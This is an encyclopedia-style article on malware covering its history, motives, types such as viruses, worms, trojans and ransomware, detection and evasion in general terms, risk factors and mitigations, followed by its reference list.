Cloud computing security
Network security

Groups
Anonymous
Chaos Computer Club
Homebrew Computer Club (defunct)
Legion of Doom (defunct)
LulzSec (defunct)
Masters of Deception (defunct)
Red team / Blue team

Publications
2600: The Hacker Quarterly
Hacker News
Nuts and Volts
Phrack
vte
Malware (a portmanteau for malicious software)[1] is any software intentionally designed to cause disruption to a computer, server, client, or computer network, leak private information, gain unauthorized access to information or systems, deprive access to information, or which unknowingly interferes with the user's computer security and privacy.[1][2][3][4][5] Researchers tend to classify malware into one or more sub-types (i.e. computer viruses, worms, Trojan horses, ransomware, spyware, adware, rogue software, wiper and keyloggers).[1]
Malware poses serious problems to individuals and businesses on the Internet.[6][7] According to Symantec's 2018 Internet Security Threat Report (ISTR), malware variants number has increased to 669,947,865 in 2017, which is twice as many malware variants as in 2016.[8] Cybercrime, which includes malware attacks as well as other crimes committed by computer, was predicted to cost the world economy $6 trillion USD in 2021, and is increasing at a rate of 15% per year.[9] Since 2021, malware has been designed to target computer systems that run critical infrastructure such as the electricity distribution network.[10]
The defense strategies against malware differ according to the type of malware but most can be thwarted by installing antivirus software, firewalls, applying regular patches to reduce zero-day attacks, securing networks from intrusion, having regular backups and isolating infected systems. Malware is now being designed to evade antivirus software detection algorithms.[8]


History[edit]
Main article: History of computer viruses
For a chronological guide, see Timeline of computer viruses and worms.
The notion of a self-reproducing computer program can be traced back to initial theories about the operation of complex automata.[11] John von Neumann showed that in theory a program could reproduce itself. This constituted a plausibility result in computability theory. Fred Cohen experimented with computer viruses and confirmed Neumann's postulate and investigated other properties of malware such as detectability and self-obfuscation using rudimentary encryption. His 1987 doctoral dissertation was on the subject of computer viruses.[12] The combination of cryptographic technology as part of the payload of the virus, exploiting it for attack purposes was initialized and investigated from the mid 1990s, and includes initial ransomware and evasion ideas.[13]
Before Internet access became widespread, viruses spread on personal computers by infecting executable programs or boot sectors of floppy disks. By inserting a copy of itself into the machine code instructions in these programs or boot sectors, a virus causes itself to be run whenever the program is run or the disk is booted. Early computer viruses were written for the Apple II and Macintosh, but they became more widespread with the dominance of the IBM PC and MS-DOS system. The first IBM PC virus in the "wild" was a boot sector virus dubbed (c)Brain,[14] created in 1986 by the Farooq Alvi brothers in Pakistan.[15] Malware distributors would trick the user into booting or running from an infected device or medium. For example, a virus could make an infected computer add autorunnable code to any USB stick plugged into it. Anyone who then attached the stick to another computer set to autorun from USB would in turn become infected, and also pass on the infection in the same way.[16]
Older email software would automatically open HTML email containing potentially malicious JavaScript code. Users may also execute disguised malicious email attachments. The 2018 Data Breach Investigations Report by Verizon, cited by CSO Online, states that emails are the primary method of malware delivery, accounting for 92% of malware delivery around the world.[17][18]
The first worms, network-borne infectious programs, originated not on personal computers, but on multitasking Unix systems. The first well-known worm was the Internet Worm of 1988, which infected SunOS and VAX BSD systems. Unlike a virus, this worm did not insert itself into other programs. Instead, it exploited security holes (vulnerabilities) in network server programs and started itself running as a separate process.[19] This same behavior is used by today's worms as well.[20]
With the rise of the Microsoft Windows platform in the 1990s, and the flexible macros of its applications, it became possible to write infectious code in the macro language of Microsoft Word and similar programs. These macro viruses infect documents and templates rather than applications (executables), but rely on the fact that macros in a Word document are a form of executable code.[21]
Many early infectious programs, including the Morris Worm, the first internet worm, were written as experiments or pranks.[22] Today, malware is used by both black hat hackers and governments to steal personal, financial, or business information.[23][24] Today, any device that plugs into a USB port – even lights, fans, speakers, toys, or peripherals such as a digital microscope – can be used to spread malware. Devices can be infected during manufacturing or supply if quality control is inadequate.[16]

Purposes[edit]
Since the rise of widespread broadband Internet access, malicious software has more frequently been designed for profit. Since 2003, the majority of widespread viruses and worms have been designed to take control of users' computers for illicit purposes.[25] Infected "zombie computers" can be used to send email spam, to host contraband data such as child pornography,[26] or to engage in distributed denial-of-service attacks as a form of extortion.[27] Malware is used broadly against government or corporate websites to gather sensitive information,[28] or to disrupt their operation in general. Further, malware can be used against individuals to gain information such as personal identification numbers or details, bank or credit card numbers, and passwords.[29][30]
In addition to criminal money-making, malware can be used for sabotage, often for political motives. Stuxnet, for example, was designed to disrupt very specific industrial equipment. There have been politically motivated attacks which spread over and shut down large computer networks, including massive deletion of files and corruption of master boot records, described as "computer killing." Such attacks were made on Sony Pictures Entertainment (25 November 2014, using malware known as Shamoon or W32.Disttrack) and Saudi Aramco (August 2012).[31][32]

Types[edit]
There are many possible ways of categorizing malware and some malicious software may overlap into two or more categories.[1] Broadly, software can categorised into three types:[33] (i) goodware; (ii) greyware and (iii) malware.


Classification of potentially malicious software Data sourced from: Molina-Coronado et. al. (2023)[33]


Type

Characteristics

Examples

Notes


Goodware

Obtained from trustworthy sources


Google Play apps
Buggy software





Malware

Broad consensus among antivirus software that program is malicious or obtained from flagged sources.


Viruses
Worms
Root kits
Backdoors
Ransomware
Trojan horses





Greyware

Insufficient consensus and/or metrics


Potentially unwanted programs
Spyware
Adware




Malware[edit]
 Hex dump of the Blaster worm, showing a message left for Microsoft co-founder Bill Gates by the worm's programmer
Virus[edit]
Main article: Computer virus
A computer virus is software usually hidden within another seemingly innocuous program that can produce copies of itself and insert them into other programs or files, and that usually performs a harmful action (such as destroying data).[34] They have been likened to biological viruses.[3]  An example of this is a portable execution infection, a technique, usually used to spread malware, that inserts extra data or executable code into PE files.[35] A computer virus is software that embeds itself in some other executable software (including the operating system itself) on the target system without the user's knowledge and consent and when it is run, the virus is spread to other executable files.

Worm[edit]
A  worm is a stand-alone malware software that actively transmits itself over a network to infect other computers and can copy itself without infecting files. These definitions lead to the observation that a virus requires the user to run an infected software or operating system for the virus to spread, whereas a worm spreads itself.[36]

Rootkits[edit]
Main article: Rootkit
Once malicious software is installed on a system, it is essential that it stays concealed, to avoid detection. Software packages known as rootkits allow this concealment, by modifying the host's operating system so that the malware is hidden from the user. Rootkits can prevent a harmful process from being visible in the system's list of processes, or keep its files from being read.[37]
Some types of harmful software contain routines to evade identification and/or removal attempts, not merely to hide themselves. An early example of this behavior is recorded in the Jargon File tale of a pair of programs infesting a Xerox CP-V time sharing system:

Each ghost-job would detect the fact that the other had been killed, and would start a new copy of the recently stopped program within a few milliseconds. The only way to kill both ghosts was to kill them simultaneously (very difficult) or to deliberately crash the system.[38]
Backdoors[edit]
Main article: Backdoor (computing)
A backdoor is a computer program that allows an attacker to gain unauthorised remote access to a victim's machine often without their knowledge.[39] The attacker typically uses another attack (such as a trojan, worm or virus) to bypass authentication mechanisms usually over an unsecured network such as the Internet to install the backdoor application. A backdoor can also be a side effect of a software bug in legitimate software that is exploited by an attacker to gain access to a victim's computer or network.
The idea has often been suggested that computer manufacturers preinstall backdoors on their systems to provide technical support for customers, but this has never been reliably verified. It was reported in 2014 that US government agencies had been diverting computers purchased by those considered "targets" to secret workshops where software or hardware permitting remote access by the agency was installed, considered to be among the most productive operations to obtain access to networks around the world.[40] Backdoors may be installed by Trojan horses, worms, implants, or other methods.[41][42]

Trojan horse[edit]
A Trojan horse misrepresents itself to masquerade as a regular, benign program or utility in order to persuade a victim to install it. A Trojan horse usually carries a hidden destructive function that is activated when the application is started. The term is derived from the Ancient Greek story of the Trojan horse used to invade the city of Troy by stealth.[43][44]
Trojan horses are generally spread by some form of social engineering, for example, where a user is duped into executing an email attachment disguised to be unsuspicious, (e.g., a routine form to be filled in), or by drive-by download. Although their payload can be anything, many modern forms act as a backdoor, contacting a controller (phoning home) which can then have unauthorized access to the affected computer, potentially installing additional software such as a keylogger to steal confidential information, cryptomining software or adware to generate revenue to the operator of the trojan.[45] While Trojan horses and backdoors are not easily detectable by themselves, computers may appear to run slower, emit more heat or fan noise due to heavy processor or network usage, as may occur when cryptomining software is installed. Cryptominers may limit resource usage and/or only run during idle times in an attempt to evade detection.
Unlike computer viruses and worms, Trojan horses generally do not attempt to inject themselves into other files or otherwise propagate themselves.[46]
In spring 2017 Mac users were hit by the new version of Proton Remote Access Trojan (RAT)[47] trained to extract password data from various sources, such as browser auto-fill data, the Mac-OS keychain, and password vaults.[48]

Droppers[edit]
Main article: Dropper_(malware)
Droppers are a sub-type of Trojans that solely aim to deliver malware upon the system that they infect with the desire to subvert detection through stealth and a light payload.[49]

Ransomware[edit]
Main article: RansomwareRansomware prevents a user from accessing their files until a ransom is paid. There are two variations of ransomware, being crypto ransomware and locker ransomware.[50] Locker ransomware just locks down a computer system without encrypting its contents, whereas crypto ransomware locks down a system and encrypts its contents. For example, programs such as CryptoLocker encrypt files securely, and only decrypt them on payment of a substantial sum of money.[51]
Some malware is used to generate money by click fraud, making it appear that the computer user has clicked an advertising link on a site, generating a payment from the advertiser. It was estimated in 2012 that about 60 to 70% of all active malware used some kind of click fraud, and 22% of all ad-clicks were fraudulent.[52]
Lock-screens, or screen lockers is a type of “cyber police” ransomware that blocks screens on Windows or Android devices with a false accusation in harvesting illegal content, trying to scare the victims into paying up a fee.[53]
Jisut and SLocker impact Android devices more than other lock-screens, with Jisut making up nearly 60 percent of all Android ransomware detections.[54]
Encryption-based ransomware, like the name suggests, is a type of ransomware that encrypts all files on an infected machine. These types of malware then display a pop-up informing the user that their files have been encrypted and that they must pay (usually in Bitcoin) to recover them. Some examples of encryption-based ransomware are CryptoLocker and WannaCry.[55]

Grayware[edit]
See also: Privacy-invasive software and Potentially unwanted program
Grayware is any unwanted application or file that can worsen the performance of computers and may cause security risks but which there is insufficient consensus or data to classify them as malware.[33] Types of greyware typically includes spyware, adware, fraudulent dialers, joke programs ("jokeware") and remote access tools.[39]  For example, at one point, Sony BMG compact discs silently installed a rootkit on purchasers' computers with the intention of preventing illicit copying.[56]

Potentially Unwanted Program (PUP)[edit]
Potentially unwanted programs (PUPs) are applications that would be considered unwanted despite often being intentionally downloaded by the user.[57] PUPs include spyware, adware, and fraudulent dialers. 
Many security products classify unauthorised key generators as PUPs, although they frequently carry true malware in addition to their ostensible purpose.[58] In fact, Kammerstetter et. al. (2012)[58] estimated that as much as 55% of key generators could contain malware and that about 36% malicious key generators were not detected by antivirus software.

Adware[edit]
Some types of adware (using stolen certificates) turn off anti-malware and virus protection; technical remedies are available.[59]

Spyware[edit]
Programs designed to monitor users' web browsing, display unsolicited advertisements, or redirect affiliate marketing revenues are called spyware. Spyware programs do not spread like viruses; instead they are generally installed by exploiting security holes. They can also be hidden and packaged together with unrelated user-installed software.[60] The Sony BMG rootkit was intended to prevent illicit copying; but also reported on users' listening habits, and unintentionally created extra security vulnerabilities.[56]

Detection[edit]
Antivirus software typically uses two techniques to detect malware: (i) static analysis and (ii) dynamic analysis.[61] Static analysis involves studying the software code of a potentially malicious program and producing a signature of that program. This information is then used to compare scanned files by an antivirus program. Because this approach is not useful for malware that has not yet been studied, antivirus software can use dynamic analysis to monitor how the program runs on a computer and block it if it performs unexpected activity. 
The aim of any malware is to conceal itself from detection by users or antivirus software.[1] Detecting potential malware is difficult for two reasons. The first is that it is difficult to determine if software is malicious.[33] The second is that malware uses technical measures to make it more difficult to detect it.[61] An estimated 33% of malware is not detected by antivirus software.[58]
The most common anti-detection mechanism is to encrypt the malware payload so that antivirus software does not recognize the signature.[33] More advanced malware is capable of changing its form into variants so they the signatures differ enough to make detection unlikely. Other common techniques used to evade detection include from common to uncommon:[62] (1) evasion of analysis and detection by fingerprinting the environment when executed;[63] (2) confusing automated tools' detection methods. This allows malware to avoid detection by technologies such as signature-based antivirus software by changing the server used by the malware;[62] (3) timing-based evasion. This is when malware runs at certain times or following certain actions taken by the user, so it executes during certain vulnerable periods, such as during the boot process, while remaining dormant the rest of the time; (4) obfuscating internal data so that automated tools do not detect the malware;[64] (v) information hiding techniques, namely stegomalware;[65] and (5) fileless malware which runs within memory instead of using files and utilizes existing system tools to carry out malicious acts.[66] This reduces the amount of forensic artifacts available to analyze. Recently these types of attacks have become more frequent with a 432% increase in 2017 and makeup 35% of the attacks in 2018. Such attacks are not easy to perform but are becoming more prevalent with the help of exploit-kits.[67][68]

Risks[edit]
Vulnerable software[edit]
A vulnerability is a weakness, flaw or software bug in an application, a complete computer, an operating system, or a computer network that is exploited by malware to bypass defences or gain privileges it requires to run. For example, TestDisk 6.4 or earlier contained a vulnerability that allowed attackers to inject code into Windows.[69] Malware can exploit security defects (security bugs or vulnerabilities) in the operating system, applications (such as browsers, e.g. older versions of Microsoft Internet Explorer supported by Windows XP[70]), or in vulnerable versions of browser plugins such as Adobe Flash Player, Adobe Acrobat or Reader, or Java SE.[71][72] For example,  a common method is exploitation of a buffer overrun vulnerability, where software designed to store data in a specified region of memory does not prevent more data than the buffer can accommodate being supplied. Malware may provide data that overflows the buffer, with malicious executable code or data after the end; when this payload is accessed it does what the attacker, not the legitimate software, determines.
Malware can exploit recently discovered vulnerabilities before developers have had time to release a suitable patch.[6] Even when new patches addressing the vulnerability have been released, they may not necessarily be installed immediately, allowing malware to take advantage of systems lacking patches. Sometimes even applying patches or installing new versions does not automatically uninstall the old versions. Security advisories from plug-in providers announce security-related updates.[73] Common vulnerabilities are assigned CVE IDs and listed in the US National Vulnerability Database. Secunia PSI[74] is an example of software, free for personal use, that will check a PC for vulnerable out-of-date software, and attempt to update it. Other approaches involve using firewalls and intrusion prevention systems to monitor unusual traffic patterns on the local computer network.[75]

Excessive privileges[edit]
Users and programs can be assigned more privileges than they require, and malware can take advantage of this. For example, of 940 Android apps sampled, one third of them asked for more privileges than they required.[76] Apps targeting the Android platform can be a major source of malware infection but one solution is to use third party software to detect apps that have been assigned excessive privileges.[77]
Some systems allow all users to modify their internal structures, and such users today would be considered over-privileged users. This was the standard operating procedure for early microcomputer and home computer systems, where there was no distinction between an administrator or root, and a regular user of the system. In some systems, non-administrator users are over-privileged by design, in the sense that they are allowed to modify internal structures of the system. In some environments, users are over-privileged because they have been inappropriately granted administrator or equivalent status.[78] This can be because users tend to demand more privileges than they need, so often end up being assigned unnecessary privileges.[79]
Some systems allow code executed by a user to access all rights of that user, which is known as over-privileged code. This was also standard operating procedure for early microcomputer and home computer systems. Malware, running as over-privileged code, can use this privilege to subvert the system. Almost all currently popular operating systems, and also many scripting applications allow code too many privileges, usually in the sense that when a user executes code, the system allows that code all rights of that user.

Weak passwords[edit]
A credential attack occurs when a user account with administrative privileges is cracked and that account is used to provide malware with appropriate privileges.[80] Typically, the attack succeeds because the weakest form of account security is used, which is typically a short password that can be cracked using a dictionary or brute force attack. Using strong passwords and enabling two-factor authentication can reduce this risk. With the latter enabled, even if an attacker can crack the password, they cannot use the account without also having the token possessed by the legitimate user of that account.

Use of the same operating system[edit]
Homogeneity can be a vulnerability. For example, when all computers in a network run the same operating system, upon exploiting one, one worm can exploit them all:[81] In particular, Microsoft Windows or Mac OS X have such a large share of the market that an exploited vulnerability concentrating on either operating system could subvert a large number of systems. It is estimated that approximately 83% of malware infections between January and March 2020 were spread via systems running Windows 10.[82] This risk is mitigated by segmenting the networks into different subnetworks and setting up firewalls to block traffic between them.[83][84]

Mitigation[edit]
Antivirus / Anti-malware software[edit]
Anti-malware (sometimes also called antivirus) programs block and remove some or all types of malware. For example, Microsoft Security Essentials (for Windows XP, Vista, and Windows 7) and Windows Defender (for Windows 8, 10 and 11) provides real-time protection. The Windows Malicious Software Removal Tool removes malicious software from the system.[85] Additionally, several capable antivirus software programs are available for free download from the Internet (usually restricted to non-commercial use).[86] Tests found some free programs to be competitive with commercial ones.[86][87][88]
Typically, antivirus software can combat malware in the following ways:

Real-time protection: They can provide real time protection against the installation of malware software on a computer. This type of malware protection works the same way as that of antivirus protection in that the anti-malware software scans all incoming network data for malware and blocks any threats it comes across.
Removal: Anti-malware software programs can be used solely for detection and removal of malware software that has already been installed onto a computer. This type of anti-malware software scans the contents of the Windows registry, operating system files, and installed programs on a computer and will provide a list of any threats found, allowing the user to choose which files to delete or keep, or to compare this list to a list of known malware components, removing files that match.[89]
Sandboxing: Provide sandboxing of apps considered dangerous (such as web browsers where most vulnerabilities are likely to be installed from).[90]
Real-time protection[edit]
A specific component of anti-malware software, commonly referred to as an on-access or real-time scanner, hooks deep into the operating system's core or kernel and functions in a manner similar to how certain malware itself would attempt to operate, though with the user's informed permission for protecting the system. Any time the operating system accesses a file, the on-access scanner checks if the file infected or not. Typically, when an infected file is found, execution is stopped and the file is quarantined to prevent further damage with the intention to prevent irreversible system damage. Most AVs allow users to override this behaviour. This can have a considerable performance impact on the operating system, though the degree of impact is dependent on how many pages it creates in virtual memory.[91]

Sandboxing[edit]
Because many malware components are installed as a result of browser exploits or user error, using security software (some of which are anti-malware, though many are not) to "sandbox" browsers (essentially isolate the browser from the computer and hence any malware induced change) can also be effective in helping to restrict any damage done.[90]

Website security scans[edit]
Website vulnerability scans check the website, detect malware, may note outdated software, and may report known security issues, in order to reduce the risk of the site being compromised.

Network Segregation[edit]
Structuring a network as a set of smaller networks, and limiting the flow of traffic between them to that known to be legitimate, can hinder the ability of infectious malware to replicate itself across the wider network. Software Defined Networking provides techniques to implement such controls.

"Air gap" isolation or "parallel network"[edit]
As a last resort, computers can be protected from malware, and the risk of infected computers disseminating trusted information can be greatly reduced by imposing an "air gap" (i.e. completely disconnecting them from all other networks) and applying enhanced controls over the entry and exit of software and data from the outside world. However, malware can still cross the air gap in some situations, not least due to the need to introduce software into the air-gapped network and can damage the availability or integrity of assets thereon. Stuxnet is an example of malware that is introduced to the target environment via a USB drive, causing damage to processes supported on the environment without the need to exfiltrate data.
AirHopper,[92] BitWhisper,[93] GSMem [94] and Fansmitter[95] are four techniques introduced by researchers that can leak data from air-gapped computers using electromagnetic, thermal and acoustic emissions.

See also[edit]

Botnet
Browser hijacking
Comparison of antivirus software
Computer security
Cuckoo's egg (metaphor)
Cybercrime
Cyber spying
Domain generation algorithm
Facebook malware
File binder
Identity theft
Industrial espionage
Linux malware
Malvertising
Phishing
Hacktivism
Riskware
Security in Web apps
Social engineering (security)
Targeted threat
Technical support scam
Telemetry software
Typosquatting
Web server overload causes
Webattacker
Zombie (computer science)

References[edit]


^ a b c d e Tahir, R. (2018). A study on malware and malware detection techniques. International Journal of Education and Management Engineering, 8(2), 20.

^ "An Undirected Attack Against Critical Infrastructure" (PDF). United States Computer Emergency Readiness Team(Us-cert.gov). Retrieved 28 September 2014.

^ a b Cani, Andrea; Gaudesi, Marco; Sanchez, Ernesto; Squillero, Giovanni; Tonda, Alberto (24 March 2014). "Towards automated malware creation: code generation and code integration". Proceedings of the 29th Annual ACM Symposium on Applied Computing. SAC '14. New York, NY, USA: Association for Computing Machinery: 157–160. doi:10.1145/2554850.2555157. ISBN 978-1-4503-2469-4. S2CID 14324560.

^ Brewer, Ross (1 September 2016). "Ransomware attacks: detection, prevention and cure". Network Security. 2016 (9): 5–9. doi:10.1016/S1353-4858(16)30086-1. ISSN 1353-4858.

^ Zhong, Fangtian; Chen, Zekai; Xu, Minghui; Zhang, Guoming; Yu, Dongxiao; Cheng, Xiuzhen (2022). "Malware-on-the-Brain: Illuminating Malware Byte Codes with Images for Malware Classification". IEEE Transactions on Computers: 1. arXiv:2108.04314. doi:10.1109/TC.2022.3160357. ISSN 0018-9340. S2CID 236965755.

^ a b Kim, Jin-Young; Bu, Seok-Jun; Cho, Sung-Bae (1 September 2018). "Zero-day malware detection using transferred generative adversarial networks based on deep autoencoders". Information Sciences. 460–461: 83–102. doi:10.1016/j.ins.2018.04.092. ISSN 0020-0255. S2CID 51882216.

^ Razak, Mohd Faizal Ab; Anuar, Nor Badrul; Salleh, Rosli; Firdaus, Ahmad (1 November 2016). "The rise of "malware": Bibliometric analysis of malware study". Journal of Network and Computer Applications. 75: 58–76. doi:10.1016/j.jnca.2016.08.022.

^ a b Xiao, Fei; Sun, Yi; Du, Donggao; Li, Xuelei; Luo, Min (21 March 2020). "A Novel Malware Classification Method Based on Crucial Behavior". Mathematical Problems in Engineering. 2020: 1–12. doi:10.1155/2020/6804290. ISSN 1024-123X.

^ Morgan, Steve (13 November 2020). "Cybercrime To Cost The World $10.5 Trillion Annually By 2025". Cybercrime magazine website. Cybersecurity ventures. Retrieved 5 March 2022.

^ Eder-Neuhauser, Peter; Zseby, Tanja; Fabini, Joachim (1 June 2019). "Malware propagation in smart grid networks: metrics, simulation and comparison of three malware types". Journal of Computer Virology and Hacking Techniques. 15 (2): 109–125. doi:10.1007/s11416-018-0325-y. ISSN 2263-8733.

^ John von Neumann, "Theory of Self-Reproducing Automata", Part 1: Transcripts of lectures given at the University of Illinois, December 1949, Editor: A. W. Burks, University of Illinois, USA, 1966.

^ Fred Cohen, "Computer Viruses", PhD Thesis, University of Southern California, ASP Press, 1988.

^ Young, Adam; Yung, Moti (2004). Malicious cryptography - exposing cryptovirology. Wiley. pp. 1–392. ISBN 978-0-7645-4975-5.

^ "Boot sector virus repair". Antivirus.about.com. 10 June 2010. Archived from the original on 12 January 2011. Retrieved 27 August 2010.

^ Avoine, Gildas; Pascal Junod; Philippe Oechslin (2007). Computer system security: basic concepts and solved exercises. EFPL Press. p. 20. ISBN 978-1-4200-4620-5. The first PC virus is credited to two brothers, Basit Farooq Alvi and Amjad Farooq Alvi, from Pakistan

^ a b "USB devices spreading viruses". CNET. CBS Interactive. Retrieved 18 February 2015.

^ 2018 Data Breach Investigations Report (PDF) (Report) (11th ed.). Verizon. 2018. p. 18. Retrieved 26 September 2022.

^ Fruhlinger, Josh (10 October 2018). "Top cybersecurity facts, figures and statistics for 2018". CSO Online. Retrieved 20 January 2020.

^ William A Hendric (4 September 2014). "Computer Virus history". The Register. Retrieved 29 March 2015.

^ "Cryptomining Worm MassMiner Exploits Multiple Vulnerabilities - Security Boulevard". Security Boulevard. 2 May 2018. Retrieved 9 May 2018.

^ "Beware of Word Document Viruses". us.norton.com. Retrieved 25 September 2017.

^ Tipton, Harold F. (26 December 2002). Information Security Management Handbook. CRC Press. ISBN 978-1-4200-7241-9.

^ "Malware". FEDERAL TRADE COMMISSION- CONSUMER INFORMATION. Retrieved 27 March 2014.

^ Hernandez, Pedro. "Microsoft Vows to Combat Government Cyber-Spying". eWeek. Retrieved 15 December 2013.

^ "Malware Revolution: A Change in Target". March 2007.

^ "Child Porn: Malware's Ultimate Evil". November 2009.

^ PC World – Zombie PCs: Silent, Growing Threat Archived 27 July 2008 at the Wayback Machine.

^ Kovacs, Eduard (27 February 2013). "MiniDuke Malware Used Against European Government Organizations". Softpedia. Retrieved 27 February 2013.

^ Claburn, Thomas (26 October 2022). "Ukrainian indicted by US govt on cybercrime charges". theregister.com. Retrieved 27 October 2022. Those deploying Raccoon used phishing messages and other tricks to get the malware onto potentially millions of victims' computers worldwide. Once installed, the code provided access to login credentials and other data stored on the compromised system.

^ "Raccoon Infostealer Disclosure". raccoon.ic3.gov. Retrieved 27 October 2022.

^ "Shamoon is latest malware to target energy sector". Retrieved 18 February 2015.

^ "Computer-killing malware used in Sony attack a wake-up call". Retrieved 18 February 2015.

^ a b c d e Molina-Coronado, Borja; Mori, Usue; Mendiburu, Alexander; Miguel-Alonso, Jose (1 January 2023). "Towards a fair comparison and realistic evaluation framework of android malware detectors based on static analysis and machine learning". Computers & Security. 124: 102996. doi:10.1016/j.cose.2022.102996. ISSN 0167-4048.

^ "What are viruses, worms, and Trojan horses?". Indiana University. The Trustees of Indiana University. Retrieved 23 February 2015.

^ Peter Szor (3 February 2005). The Art of Computer Virus Research and Defense. Pearson Education. p. 204. ISBN 978-0-672-33390-3.

^ "computer virus – Encyclopædia Britannica". Britannica.com. Retrieved 28 April 2013.

^ McDowell, Mindi. "Understanding Hidden Threats: Rootkits and Botnets". US-CERT. Retrieved 6 February 2013.

^ "The Meaning of 'Hack'". Catb.org. Retrieved 15 April 2010.

^ a b Gill, Harjeevan (21 June 2022). "Malware: Types, Analysis and Classifications". {{cite journal}}: Cite journal requires |journal= (help)

^ Staff, SPIEGEL (29 December 2013). "Inside TAO: Documents Reveal Top NSA Hacking Unit". Spiegel Online. SPIEGEL. Retrieved 23 January 2014.

^ Edwards, John. "Top Zombie, Trojan Horse and Bot Threats". IT Security. Archived from the original on 9 February 2017. Retrieved 25 September 2007.

^ Appelbaum, Jacob (29 December 2013). "Shopping for Spy Gear:Catalog Advertises NSA Toolbox". Spiegel Online. SPIEGEL. Retrieved 29 December 2013.

^ Landwehr, C. E; A. R Bull; J. P McDermott; W. S Choi (1993). A taxonomy of computer program security flaws, with examples (PDF). DTIC Document. Archived from the original on 8 April 2013. Retrieved 5 April 2012.

^ "Trojan Horse: [coined By MIT-hacker-turned-NSA-spook Dan Edwards] N." Archived from the original on 5 July 2017. Retrieved 5 April 2012.

^ "What is the difference between viruses, worms, and Trojan horses?". Symantec Corporation. Retrieved 10 January 2009.

^ "VIRUS-L/comp.virus Frequently Asked Questions (FAQ) v2.00 (Question B3: What is a Trojan Horse?)". 9 October 1995. Retrieved 13 September 2012.

^ "Proton Mac Trojan Has Apple Code Signing Signatures Sold to Customers for $50k". AppleInsider.

^ "Non-Windows Malware". Betanews. 24 August 2017.

^ "Trojan Dropper". MalwareBytes. 30 January 2020. Retrieved 31 October 2022.

^ Richardson, Ronny; North, Max (1 January 2017). "Ransomware: Evolution, Mitigation and Prevention". International Management Review. 13 (1): 10–21.

^ Fruhlinger, Josh (1 August 2017). "The 5 biggest ransomware attacks of the last 5 years". CSO. Retrieved 23 March 2018.

^ "Another way Microsoft is disrupting the malware ecosystem". Archived from the original on 20 September 2015. Retrieved 18 February 2015.

^ "Rise of Android Ransomware, research" (PDF). ESET.

^ "State of Malware, research" (PDF). Malwarebytes.

^ O'Kane, P., Sezer, S. and Carlin, D. (2018), Evolution of ransomware. IET Netw., 7: 321-327. https://doi.org/10.1049/iet-net.2017.0207

^ a b Russinovich, Mark (31 October 2005). "Sony, Rootkits and Digital Rights Management Gone Too Far". Mark's Blog. Microsoft MSDN. Retrieved 29 July 2009.

^ "Rating the best anti-malware solutions". Arstechnica. 15 December 2009. Retrieved 28 January 2014.

^ a b c Kammerstetter, Markus; Platzer, Christian; Wondracek, Gilbert (16 October 2012). "Vanity, cracks and malware: insights into the anti-copy protection ecosystem". Proceedings of the 2012 ACM conference on Computer and communications security. CCS '12. New York, NY, USA: Association for Computing Machinery: 809–820. doi:10.1145/2382196.2382282. ISBN 978-1-4503-1651-4.

^ Casey, Henry T. (25 November 2015). "Latest adware disables antivirus software". Tom's Guide. Yahoo.com. Retrieved 25 November 2015.

^ "Peer To Peer Information". NORTH CAROLINA STATE UNIVERSITY. Retrieved 25 March 2011.

^ a b Si̇ngh, Jagsir; Si̇ngh, Jaswinder (1 September 2018). "Challenge of Malware Analysis: Malware obfuscation Techniques". International Journal of Information Security Science. 7 (3): 100–110.

^ a b The Four Most Common Evasive Techniques Used by Malware. 27 April 2015.

^ Kirat, Dhilung; Vigna, Giovanni; Kruegel, Christopher (2014). Barecloud: bare-metal analysis-based evasive malware detection. ACM. pp. 287–301. ISBN 978-1-931971-15-7.  Freely accessible at: "Barecloud: bare-metal analysis-based evasive malware detection" (PDF).

^ Young, Adam; Yung, Moti (1997). "Deniable Password Snatching: On the Possibility of Evasive Electronic Espionage". Symp. on Security and Privacy. IEEE. pp. 224–235. ISBN 0-8186-7828-3.

^ Cabaj, Krzysztof; Caviglione, Luca; Mazurczyk, Wojciech; Wendzel, Steffen; Woodward, Alan; Zander, Sebastian (May 2018). "The New Threats of Information Hiding: The Road Ahead". IT Professional. 20 (3): 31–39. arXiv:1801.00694. doi:10.1109/MITP.2018.032501746. S2CID 22328658.

^ Sudhakar; Kumar, Sushil (14 January 2020). "An emerging threat Fileless malware: a survey and research challenges". Cybersecurity. 3 (1): 1. doi:10.1186/s42400-019-0043-x. ISSN 2523-3246.

^ "Penn State WebAccess Secure Login". webaccess.psu.edu. doi:10.1145/3365001. Retrieved 29 February 2020.

^ "Malware Dynamic Analysis Evasion Techniques: A Survey". ResearchGate. Retrieved 29 February 2020.

^ Németh, Z. L. (2015). Modern binary attacks and defences in the windows environment—Fighting against microsoft EMET in seven rounds. 2015 IEEE 13th International Symposium on Intelligent Systems and Informatics (SISY), 275–280. https://doi.org/10.1109/SISY.2015.7325394

^ "Global Web Browser... Security Trends" (PDF). Kaspersky lab. November 2012.

^ Rashid, Fahmida Y. (27 November 2012). "Updated Browsers Still Vulnerable to Attack if Plugins Are Outdated". pcmag.com. Archived from the original on 9 April 2016. Retrieved 17 January 2013.

^ Danchev, Dancho (18 August 2011). "Kaspersky: 12 different vulnerabilities detected on every PC". pcmag.com.

^ "Adobe Security bulletins and advisories". Adobe.com. Retrieved 19 January 2013.

^ Rubenking, Neil J. "Secunia Personal Software Inspector 3.0 Review & Rating". PCMag.com. Retrieved 19 January 2013.

^ Morales, Jose Andre; Al-Bataineh, Areej; Xu, Shouhuai; Sandhu, Ravi (2010).  Jajodia, Sushil; Zhou, Jianying (eds.). "Analyzing and Exploiting Network Behaviors of Malware". Security and Privacy in Communication Networks. Lecture Notes of the Institute for Computer Sciences, Social Informatics and Telecommunications Engineering. Berlin, Heidelberg: Springer. 50: 20–34. doi:10.1007/978-3-642-16161-2_2. ISBN 978-3-642-16161-2.

^ Felt, Adrienne Porter; Chin, Erika; Hanna, Steve; Song, Dawn; Wagner, David (17 October 2011). "Android permissions demystified". Proceedings of the 18th ACM Conference on Computer and Communications Security. CCS '11. New York, NY, USA: Association for Computing Machinery: 627–638. doi:10.1145/2046707.2046779. ISBN 978-1-4503-0948-6. S2CID 895039.

^ Wu, Sha; Liu, Jiajia (May 2019). "Overprivileged Permission Detection for Android Applications". ICC 2019 - 2019 IEEE International Conference on Communications (ICC): 1–6. doi:10.1109/ICC.2019.8761572. ISBN 978-1-5386-8088-9. S2CID 198168673.

^ "Malware, viruses, worms, Trojan horses and spyware". list.ercacinnican.tk. Retrieved 14 November 2020.

